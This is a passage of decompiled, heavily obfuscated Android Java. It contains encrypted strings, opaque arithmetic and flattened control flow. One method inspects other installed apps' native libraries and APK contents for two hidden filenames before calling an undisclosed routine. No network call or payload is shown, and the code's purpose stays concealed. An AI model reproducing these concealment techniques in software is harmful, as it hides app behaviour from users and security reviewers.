                    long j208 = (((((((((j206 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j206 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j206 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j206 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j207 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((j207 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j207 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((((j207 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32)) + 6148914691236517205L;
                    long j209 = (j208 >>> 48) & 43690;
                    long j210 = ((j209 >>> 2) | (j209 >>> 1)) & 858993459;
                    long j211 = (j210 | (j210 >>> 2)) & 252645135;
                    long j212 = (j208 >>> 32) & 43690;
                    long j213 = ((j212 >>> 2) | (j212 >>> 1)) & 858993459;
                    long j214 = (j213 | (j213 >>> 2)) & 252645135;
                    long j215 = (((j214 | (j214 >>> 4)) & 16711935) << 16) + (((j211 | (j211 >>> 4)) & 16711935) << 24);
                    long j216 = (j208 >>> 16) & 43690;
                    long j217 = ((j216 >>> 2) | (j216 >>> 1)) & 858993459;
                    long j218 = (j217 | (j217 >>> 2)) & 252645135;
                    long j219 = j208 & 43690;
                    long j220 = ((j219 >>> 2) | (j219 >>> 1)) & 858993459;
                    long j221 = (j220 | (j220 >>> 2)) & 252645135;
                    int i5 = ((int) (((j221 | (j221 >>> 4)) & 16711935) + ((((j218 | (j218 >>> 4)) & 16711935) << 8) | j215))) & 273724004;
                    long j222 = 1074819076;
                    long j223 = 0;
                    long j224 = (((((((((j222 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j222 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j222 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j222 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j223 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j223 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j223 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j223 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                    long j225 = (j224 >>> 48) & 43690;
                    long j226 = ((j225 >>> 2) | (j225 >>> 1)) & 858993459;
                    long j227 = (j226 | (j226 >>> 2)) & 252645135;
                    long j228 = (j224 >>> 32) & 43690;
                    long j229 = ((j228 >>> 2) | (j228 >>> 1)) & 858993459;
                    long j230 = (j229 | (j229 >>> 2)) & 252645135;
                    long j231 = (((j227 | (j227 >>> 4)) & 16711935) << 24) | (((j230 | (j230 >>> 4)) & 16711935) << 16);
                    long j232 = (j224 >>> 16) & 43690;
                    long j233 = ((j232 >>> 2) | (j232 >>> 1)) & 858993459;
                    long j234 = (j233 | (j233 >>> 2)) & 252645135;
                    long j235 = j224 & 43690;
                    long j236 = ((j235 >>> 2) | (j235 >>> 1)) & 858993459;
                    long j237 = (j236 | (j236 >>> 2)) & 252645135;
                    int i6 = i5 + (((int) (((j237 | (j237 >>> 4)) & 16711935) + (j231 | (((j234 | (j234 >>> 4)) & 16711935) << 8)))) | 1073956994);
                    long j238 = 1347680996;
                    long j239 = i6;
                    long j240 = ((((((((j238 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((j238 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j238 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((((j238 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32)) + (((((((((j239 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((j239 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j239 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((((j239 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32));
                    long j241 = (j240 >>> 48) & 21845;
                    long j242 = (j241 | (j241 >>> 1)) & 858993459;
                    long j243 = (j242 | (j242 >>> 2)) & 252645135;
                    long j244 = (j240 >>> 32) & 21845;
                    long j245 = (j244 | (j244 >>> 1)) & 858993459;
                    long j246 = (j245 | (j245 >>> 2)) & 252645135;
                    long j247 = (((j243 | (j243 >>> 4)) & 16711935) << 24) | (((j246 | (j246 >>> 4)) & 16711935) << 16);
                    long j248 = (j240 >>> 16) & 21845;
                    long j249 = (j248 | (j248 >>> 1)) & 858993459;
                    long j250 = (j249 | (j249 >>> 2)) & 252645135;
                    long j251 = j240 & 21845;
                    long j252 = (j251 | (j251 >>> 1)) & 858993459;
                    long j253 = (j252 | (j252 >>> 2)) & 252645135;
                    bArr6[(int) (((j253 | (j253 >>> 4)) & 16711935) | j247 | (((j250 | (j250 >>> 4)) & 16711935) << 8))] = -94;
                    bArr6[3] = 101;
                    bArr6[4] = 120;
                    bArr6[5] = -26;
                    z(bArr6, new byte[]{-12, 120, 113, -75, 31, -125, -101, 87});
                    if (!str.equals(new String(bArr6, StandardCharsets.UTF_8).intern())) {
                        c4 = 7159;
                    }
                default:
            }
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:44:0x03f5. Please report as an issue. */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r44v0 */
    /* JADX WARN: Type inference failed for: r44v1 */
    /* JADX WARN: Type inference failed for: r44v10 */
    /* JADX WARN: Type inference failed for: r44v11 */
    /* JADX WARN: Type inference failed for: r44v12 */
    /* JADX WARN: Type inference failed for: r44v2 */
    /* JADX WARN: Type inference failed for: r44v20 */
    /* JADX WARN: Type inference failed for: r44v25 */
    /* JADX WARN: Type inference failed for: r44v26 */
    /* JADX WARN: Type inference failed for: r44v6 */
    public final boolean S(Context context) {
        boolean z3;
        int i;
        char c4;
        int i3;
        int i4;
        int i5;
        ArrayList arrayList;
        ArrayList arrayList2;
        ArrayList arrayList3;
        Throwable th;
        int i6;
        ArrayList arrayList4;
        int i7;
        int lastIndexOf;
        ActivityInfo activityInfo;
        ApplicationInfo applicationInfo;
        String str;
        File[] listFiles;
        int i8 = 0;
        try {
            byte[] bArr = {36, -5, -114, -98, -109, 14, -90, -30, -22, 50, -47, -52, -39, -109, -106, 100, -85, -31, 0, -56, 104, -81, 58, 9, -39, 19};
            byte[] bArr2 = new byte[26];
            long j2 = 97579355;
            long j3 = 72624976668147841L;
            int i9 = 8;
            char c5 = 16;
            long j4 = ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845);
            long j5 = (((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
            long j6 = j5 + j4 + (j5 | j4);
            long j7 = (j6 >>> 48) & 21845;
            long j8 = ((j7 >>> 1) | j7) & 858993459;
            long j9 = ((j8 >>> 2) | j8) & 252645135;
            int i10 = 4;
            long j10 = (j6 >>> 32) & 21845;
            long j11 = ((j10 >>> 1) | j10) & 858993459;
            long j12 = ((j11 >>> 2) | j11) & 252645135;
            long j13 = ((((j12 >>> 4) | j12) & 16711935) << 16) | ((((j9 >>> 4) | j9) & 16711935) << 24);
            long j14 = (j6 >>> 16) & 21845;
            long j15 = ((j14 >>> 1) | j14) & 858993459;
            long j16 = ((j15 >>> 2) | j15) & 252645135;
            long j17 = j6 & 21845;
            long j18 = (j17 | (j17 >>> 1)) & 858993459;
            long j19 = (j18 | (j18 >>> 2)) & 252645135;
            bArr2[(int) (((j19 | (j19 >>> 4)) & 16711935) | (((((j16 >>> 4) | j16) & 16711935) << 8) + j13))] = 69;
            bArr2[1] = -107;
            bArr2[2] = -22;
            bArr2[3] = -20;
            bArr2[4] = -4;
            bArr2[5] = 103;
            bArr2[6] = -62;
            bArr2[7] = -52;
            bArr2[8] = -125;
            bArr2[9] = 92;
            bArr2[10] = -91;
            bArr2[11] = -87;
            bArr2[12] = -73;
            ?? r44 = 13;
            bArr2[13] = -25;
            bArr2[14] = -72;
            bArr2[15] = 5;
            bArr2[16] = -56;
            bArr2[17] = -107;
            bArr2[18] = 105;
            bArr2[19] = -89;
            bArr2[20] = 6;
            bArr2[21] = -127;
            bArr2[22] = 119;
            bArr2[23] = 72;
            bArr2[24] = -112;
            bArr2[25] = 93;
            B(bArr, bArr2);
            Charset charset = StandardCharsets.UTF_8;
            List<ResolveInfo> queryIntentActivities = context.getPackageManager().queryIntentActivities(new Intent(new String(bArr, charset).intern()), 131072);
            ArrayList arrayList5 = new ArrayList();
            byte[] bArr3 = {96, -33, 115, 71, 30, 125, 87, -123, -113, 63, 39, -107, 9, -93};
            int i11 = -29;
            B(bArr3, new byte[]{12, -74, 17, 44, 123, 15, 57, -32, -29, 76, 82, -69, 122, -52});
            String intern = new String(bArr3, charset).intern();
            byte[] bArr4 = {109, -19, -88, 3, -92, 103, 33, 42, 19, 66, -44, -4, 33, -29, 4, 46};
            int i12 = 1;
            long j20 = 692686392;
            long a2 = AbstractC0099x.a(692686415, 2, -692686416);
            long j21 = ((((((((j20 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j20 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j20 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j20 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((a2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((a2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((a2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((a2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
            long j22 = (j21 >>> 48) & 21845;
            long j23 = ((j22 >>> 1) | j22) & 858993459;
            long j24 = ((j23 >>> 2) | j23) & 252645135;
            long j25 = (j21 >>> 32) & 21845;
            long j26 = ((j25 >>> 1) | j25) & 858993459;
            long j27 = ((j26 >>> 2) | j26) & 252645135;
            long j28 = ((((j27 >>> 4) | j27) & 16711935) << 16) | ((((j24 >>> 4) | j24) & 16711935) << 24);
            long j29 = (j21 >>> 16) & 21845;
            long j30 = ((j29 >>> 1) | j29) & 858993459;
            long j31 = ((j30 >>> 2) | j30) & 252645135;
            long j32 = j21 & 21845;
            long j33 = ((j32 >>> 1) | j32) & 858993459;
            long j34 = ((j33 >>> 2) | j33) & 252645135;
            long j35 = ((j34 >>> 4) | j34) & 16711935;
            byte b4 = -109;
            B(bArr4, new byte[]{1, -124, -54, 110, -59, 0, 72, 89, 120, 32, -69, -109, 85, -51, (int) (j35 | ((((j31 >>> 4) | j31) & 16711935) << 8) | j28), 65});
            String intern2 = new String(bArr4, charset).intern();
            Iterator<ResolveInfo> it = queryIntentActivities.iterator();
            while (true) {
                if (!it.hasNext()) {
                    z3 = false;
                    break;
                }
                ResolveInfo next = it.next();
                if (next != null && (activityInfo = next.activityInfo) != null && (applicationInfo = activityInfo.applicationInfo) != null && (str = applicationInfo.nativeLibraryDir) != null) {
                    File file = new File(str);
                    if (file.exists() && file.isDirectory() && (listFiles = file.listFiles()) != null && listFiles.length > 0) {
                        File file2 = new File(file, intern);
                        File file3 = new File(file, intern2);
                        if (file2.exists() && file3.exists()) {
                            z3 = true;
                            break;
                        }
                    } else {
                        arrayList5.add(next);
                    }
                }
            }
            if (z3) {
                i = 0;
                c4 = 16;
                j35 = 72624976668147841L;
                i3 = 4;
            } else {
                int size = arrayList5.size();
                boolean z4 = z3;
                int i13 = 0;
                while (true) {
                    if (i13 < size) {
                        int i14 = i13 + 1;
                        ResolveInfo resolveInfo = (ResolveInfo) arrayList5.get(i13);
                        c4 = c5;
                        byte b5 = b4;
                        i = -2106712333;
                        ActivityInfo activityInfo2 = null;
                        String str2 = null;
                        ApplicationInfo applicationInfo2 = null;
                        while (true) {
                            switch (i) {
                                case -2106712333:
                                    i4 = i8;
                                    ArrayList arrayList6 = arrayList5;
                                    i11 = size;
                                    j35 = j3;
                                    i3 = i10;
                                    if (resolveInfo != null) {
                                        i = 472595731;
                                        i8 = i4;
                                        i10 = i3;
                                        arrayList5 = arrayList6;
                                        size = i11;
                                        j3 = j35;
                                        i9 = 8;
                                        str2 = null;
                                        r44 = arrayList6;
                                        i12 = 1;
                                    } else {
                                        str2 = null;
                                        arrayList = arrayList6;
                                        i10 = i3;
                                        i8 = i4;
                                        i = 1003303093;
                                        arrayList2 = arrayList;
                                        arrayList5 = arrayList2;
                                        size = i11;
                                        j3 = j35;
                                        i9 = 8;
                                        r44 = arrayList2;
                                        i12 = 1;
                                    }
                                case -667812413:
                                    i4 = i8;
                                    ArrayList arrayList7 = arrayList5;
                                    i11 = size;
                                    j35 = j3;
                                    i3 = i10;
                                    applicationInfo2 = activityInfo2.applicationInfo;
                                    arrayList = arrayList7;
                                    if (applicationInfo2 != null) {
                                        i5 = 2140077488;
                                        arrayList3 = arrayList7;
                                        int i15 = i4;
                                        i = i5;
                                        i8 = i15;
                                        i10 = i3;
                                        arrayList2 = arrayList3;
                                        arrayList5 = arrayList2;
                                        size = i11;
                                        j3 = j35;
                                        i9 = 8;
                                        r44 = arrayList2;
                                        i12 = 1;
                                    }
                                    i10 = i3;
                                    i8 = i4;
                                    i = 1003303093;
                                    arrayList2 = arrayList;
                                    arrayList5 = arrayList2;
                                    size = i11;
                                    j3 = j35;
                                    i9 = 8;
                                    r44 = arrayList2;
                                    i12 = 1;
                                case 472595731:
                                    i4 = i8;
                                    ArrayList arrayList8 = arrayList5;
                                    i11 = size;
                                    j35 = j3;
                                    i3 = i10;
                                    activityInfo2 = resolveInfo.activityInfo;
                                    arrayList = arrayList8;
                                    if (activityInfo2 != null) {
                                        i5 = -667812413;
                                        arrayList3 = arrayList8;
                                        int i152 = i4;
                                        i = i5;
                                        i8 = i152;
                                        i10 = i3;
                                        arrayList2 = arrayList3;
                                        arrayList5 = arrayList2;
                                        size = i11;
                                        j3 = j35;
                                        i9 = 8;
                                        r44 = arrayList2;
                                        i12 = 1;
                                    }
                                    i10 = i3;
                                    i8 = i4;
                                    i = 1003303093;
                                    arrayList2 = arrayList;
                                    arrayList5 = arrayList2;
                                    size = i11;
                                    j3 = j35;
                                    i9 = 8;
                                    r44 = arrayList2;
                                    i12 = 1;
                                case 1003303093:
                                    if (str2 == null) {
                                        i13 = i14;
                                        c5 = c4;
                                        b4 = b5;
                                    } else {
                                        File file4 = new File(str2);
                                        if (file4.exists() && file4.isFile()) {
                                            try {
                                                try {
                                                    ZipFile zipFile = new ZipFile(file4);
                                                    try {
                                                        Enumeration<? extends ZipEntry> entries = zipFile.entries();
                                                        int i16 = i8;
                                                        int i17 = i16;
                                                        while (entries.hasMoreElements()) {
                                                            String name = entries.nextElement().getName();
                                                            long j36 = j3;
                                                            try {
                                                                byte[] bArr5 = new byte[i10];
                                                                // fill-array-data instruction
                                                                bArr5[0] = -69;
                                                                bArr5[1] = -86;
                                                                bArr5[2] = -44;
                                                                bArr5[3] = -84;
                                                                int i18 = i10;
                                                                try {
                                                                    byte[] bArr6 = new byte[i9];
                                                                    // fill-array-data instruction
                                                                    bArr6[0] = -41;
                                                                    bArr6[1] = -61;
                                                                    bArr6[2] = -74;
                                                                    bArr6[3] = -125;
                                                                    bArr6[4] = -13;
                                                                    bArr6[5] = 119;
                                                                    bArr6[6] = -32;
                                                                    bArr6[7] = -56;
                                                                    try {
                                                                        B(bArr5, bArr6);
                                                                        Charset charset2 = StandardCharsets.UTF_8;
                                                                        if (name.startsWith(new String(bArr5, charset2).intern())) {
                                                                            i6 = i8;
                                                                            try {
                                                                                byte[] bArr7 = new byte[3];
                                                                                bArr7[i6] = -83;
                                                                                bArr7[i12] = 112;
                                                                                arrayList4 = arrayList5;
                                                                                i7 = size;
                                                                                try {
                                                                                    bArr7[1214201148 ^ D.a(1079393556, 3, -(D1.a(1079393556, 134807594) | 2), i12)] = b5;
                                                                                    B(bArr7, new byte[]{-125, 3, -4, -62, 89, 90, -16, -7});
                                                                                    if (name.endsWith(new String(bArr7, charset2).intern()) && (lastIndexOf = name.lastIndexOf(47)) >= 0 && lastIndexOf < name.length() - 1) {
                                                                                        String substring = name.substring(lastIndexOf + 1);
                                                                                        if (substring.equals(intern)) {
                                                                                            i16 = 1;
                                                                                        } else if (substring.equals(intern2)) {
                                                                                            i17 = 1;
                                                                                        }
                                                                                        if (i16 != 0 && i17 != 0) {
                                                                                            zipFile.close();
                                                                                            break;
                                                                                        }
                                                                                    }
                                                                                } catch (Throwable th2) {
                                                                                    th = th2;
                                                                                    th = th;
                                                                                    try {
                                                                                        zipFile.close();
                                                                                        throw th;
                                                                                    } catch (Throwable th3) {
                                                                                        th.addSuppressed(th3);
                                                                                        throw th;
                                                                                    }
                                                                                }
                                                                            } catch (Throwable th4) {
                                                                                th = th4;
                                                                                th = th;
                                                                                zipFile.close();
                                                                                throw th;
                                                                            }
                                                                        } else {
                                                                            i6 = i8;
                                                                            arrayList4 = arrayList5;
                                                                            i7 = size;
                                                                        }
                                                                        i10 = i18;
                                                                        i8 = i6;
                                                                        arrayList5 = arrayList4;
                                                                        size = i7;
                                                                        j3 = j36;
                                                                        i9 = 8;
                                                                        i12 = 1;
                                                                    } catch (Throwable th5) {
                                                                        th = th5;
                                                                    }
                                                                } catch (Throwable th6) {
                                                                    th = th6;
                                                                }
                                                            } catch (Throwable th7) {
                                                                th = th7;
                                                                th = th;
                                                                zipFile.close();
                                                                throw th;
                                                            }
                                                        }
                                                        zipFile.close();
                                                    } catch (Throwable th8) {
                                                        th = th8;
                                                    }
                                                } catch (Exception unused) {
                                                }
                                            } catch (Exception unused2) {
                                            }
                                        }
                                        i = i8;
                                        r44 = arrayList5;
                                        i11 = size;
                                        j35 = j3;
                                        i3 = i10;
                                        if (z4) {
                                            break;
                                        } else {
                                            i13 = i14;
                                            i10 = i3;
                                            i8 = i;
                                            c5 = c4;
                                            b4 = b5;
                                            arrayList5 = r44;
                                            size = i11;
                                            j3 = j35;
                                            i9 = 8;
                                            i12 = 1;
                                        }
                                    }
                                    break;
                                case 2140077488:
                                    try {
                                        str2 = applicationInfo2.sourceDir;
                                        i = 1003303093;
                                    } catch (Throwable unused3) {
                                        break;
                                    }
                                default:
                                    i = -2106712333;
                            }
                        }
                    } else {
                        i = i8;
                        c4 = c5;
                        j35 = j3;
                        i3 = i10;
                    }
                }
                z3 = z4;
            }
            if (z3) {
                byte[] bArr8 = new byte[8];
                bArr8[i] = -48;
                bArr8[1] = -75;
                bArr8[2] = 69;
                bArr8[3] = 31;
                bArr8[i3] = 84;
                bArr8[5] = 118;
                bArr8[6] = -2;
                bArr8[7] = 99;
                long j37 = 1358964760;
                long j38 = i;
                long j39 = (((((((((j37 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << 48) | ((((((((j37 >>> c4) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << 32) | (((((((((j37 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << c4) + ((((((j37 & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845))) + (((((((((j38 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << 48) | ((((((j38 & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) | ((((((((j38 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << c4) | ((((((((j38 >>> c4) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << 32));
                long j40 = (j39 >>> 48) & 43690;
                long j41 = ((j40 >>> 2) | (j40 >>> 1)) & 858993459;
                long j42 = (j41 | (j41 >>> 2)) & 252645135;
                long j43 = (j39 >>> 32) & 43690;
                long j44 = ((j43 >>> 2) | (j43 >>> 1)) & 858993459;
                long j45 = (j44 | (j44 >>> 2)) & 252645135;
                long j46 = (((j42 | (j42 >>> i3)) & 16711935) << 24) | (((j45 | (j45 >>> i3)) & 16711935) << c4);
                long j47 = (j39 >>> c4) & 43690;
                long j48 = ((j47 >>> 2) | (j47 >>> 1)) & 858993459;
                long j49 = (j48 | (j48 >>> 2)) & 252645135;
                long j50 = j39 & 43690;
                long j51 = ((j50 >>> 2) | (j50 >>> 1)) & 858993459;
                long j52 = (j51 | (j51 >>> 2)) & 252645135;
                int i19 = ((int) (((j52 | (j52 >>> i3)) & 16711935) + (j46 | (((j49 | (j49 >>> i3)) & 16711935) << 8)))) | 1392519178;
                long j53 = 1529456736;
                long a4 = V2.a(i19, -136937585, (~i19) - 136937585);
                long j54 = ((((((((j53 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << 48) + (((((((j53 & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) | ((((((((j53 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << c4) | ((((((((j53 >>> c4) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << 32)) + ((((((((a4 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << 48) + ((((((((a4 >>> c4) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << 32) + ((((((((a4 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << c4) + ((((((a4 & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845);
                long j55 = (j54 >>> 48) & 21845;
                long j56 = (j55 | (j55 >>> 1)) & 858993459;
                long j57 = (j56 | (j56 >>> 2)) & 252645135;
                long j58 = (j54 >>> 32) & 21845;
                long j59 = (j58 | (j58 >>> 1)) & 858993459;
                long j60 = (j59 | (j59 >>> 2)) & 252645135;
                long j61 = (((j57 | (j57 >>> i3)) & 16711935) << 24) | (((j60 | (j60 >>> i3)) & 16711935) << c4);
                long j62 = (j54 >>> c4) & 21845;
                long j63 = (j62 | (j62 >>> 1)) & 858993459;
                long j64 = (j63 | (j63 >>> 2)) & 252645135;
                long j65 = j54 & 21845;
                long j66 = (j65 | (j65 >>> 1)) & 858993459;
                long j67 = (j66 | (j66 >>> 2)) & 252645135;
                byte b6 = (int) (((j67 | (j67 >>> i3)) & 16711935) | ((((j64 | (j64 >>> i3)) & 16711935) << 8) + j61));
                byte[] bArr9 = new byte[8];
                bArr9[0] = -69;
                bArr9[1] = -48;
                bArr9[2] = 55;
                bArr9[3] = 113;
                bArr9[i3] = 49;
                bArr9[5] = b6;
                bArr9[6] = -83;
                bArr9[7] = 54;
                B(bArr8, bArr9);
                Charset charset3 = StandardCharsets.UTF_8;
                String intern3 = new String(bArr8, charset3).intern();
                byte[] bArr10 = new byte[i3];
                // fill-array-data instruction
                bArr10[0] = 113;
                bArr10[1] = 40;
                bArr10[2] = -43;
                bArr10[3] = 51;
                long j68 = -1861447264;
                long j69 = -1;
                long j70 = ((((((((j68 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << 48) + (((((((((j68 >>> c4) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << 32) | (((((((((j68 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << c4) + ((((((j68 & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845))) + (((((((((j69 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << 48) | (((((((((j69 >>> c4) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << 32) + ((((((((j69 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845) << c4) + ((((((j69 & 255) * 72340172838076673L) & (-9205322385119247871L)) * j35) >>> 49) & 21845)));
                long j71 = (j70 >>> 48) & 43690;
                long j72 = ((j71 >>> 2) | (j71 >>> 1)) & 858993459;
                long j73 = (j72 | (j72 >>> 2)) & 252645135;
                long j74 = (j70 >>> 32) & 43690;
                long j75 = ((j74 >>> 2) | (j74 >>> 1)) & 858993459;
                long j76 = ((j75 >>> 2) | j75) & 252645135;
                long j77 = (((j73 | (j73 >>> 4)) & 16711935) << 24) | ((((j76 >>> 4) | j76) & 16711935) << c4);
                long j78 = (j70 >>> c4) & 43690;
                long j79 = ((j78 >>> 2) | (j78 >>> 1)) & 858993459;
                long j80 = ((j79 >>> 2) | j79) & 252645135;
                long j81 = j70 & 43690;
                long j82 = ((j81 >>> 2) | (j81 >>> 1)) & 858993459;
                long j83 = (j82 | (j82 >>> 2)) & 252645135;
                int i20 = ((int) (((j83 | (j83 >>> 4)) & 16711935) + ((((j80 >>> 4) | j80) & 16711935) << 8) + j77)) + 147931674;
                byte[] bArr11 = new byte[((i20 & 1713515597) * 2) + ((-1713515598) - i20)];
                bArr11[0] = 5;
                bArr11[1] = 90;
                bArr11[2] = -96;
                bArr11[3] = 86;
                bArr11[4] = -40;
                bArr11[5] = -79;
                bArr11[6] = -30;
                bArr11[7] = 7;
                B(bArr10, bArr11);
                try {
                    t(intern3, new String(bArr10, charset3).intern());
                    return true;
                } catch (Throwable unused4) {
                    return false;
                }
            }
        } catch (Throwable unused5) {
        }
        return false;
    }

    public final boolean T() {
        String str = null;
        char c4 = 63955;
        while (true) {
            if (c4 != 14250) {
                if (c4 != 63955) {
                    if (c4 == 50620) {
                        return false;
                    }
                    if (c4 == 19639) {
                        byte[] bArr = new byte[30];
                        bArr[0] = -63;
                        bArr[1] = 80;
                        bArr[2] = -75;
                        bArr[3] = -89;
                        bArr[4] = 77;
                        bArr[5] = -65;
                        bArr[6] = 70;
                        bArr[7] = -109;
                        bArr[8] = -3;
                        bArr[9] = -34;
                        bArr[10] = -26;
                        bArr[11] = 36;
                        bArr[12] = 106;
                        bArr[13] = 105;
                        bArr[14] = 69;
                        bArr[15] = 13;
                        bArr[16] = 13;
                        long j2 = -1116214124;
                        long j3 = -1;
                        long j4 = ((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845);
                        long j5 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                        long j6 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                        long j7 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (j6 | (j5 + j4)) + 6148914691236517205L;
                        long j8 = (j7 >>> 48) & 43690;
                        long j9 = ((j8 >>> 2) | (j8 >>> 1)) & 858993459;
                        long j10 = ((j9 >>> 2) | j9) & 252645135;
                        long j11 = (j7 >>> 32) & 43690;
                        long j12 = ((j11 >>> 2) | (j11 >>> 1)) & 858993459;
                        long j13 = ((j12 >>> 2) | j12) & 252645135;
                        long j14 = ((((j13 >>> 4) | j13) & 16711935) << 16) + ((((j10 >>> 4) | j10) & 16711935) << 24);
                        long j15 = (j7 >>> 16) & 43690;
